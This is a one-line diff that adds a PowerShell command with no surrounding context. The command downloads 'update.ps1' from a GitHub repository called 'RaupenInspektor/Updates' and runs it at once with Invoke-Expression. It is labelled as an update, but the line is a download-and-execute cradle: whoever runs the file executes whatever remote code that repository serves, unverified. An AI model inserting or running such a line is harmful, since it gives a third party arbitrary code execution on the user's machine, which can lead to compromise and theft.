@@ -1,0 +1,1 @@
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/update.ps1" -UseBasicParsing).Content
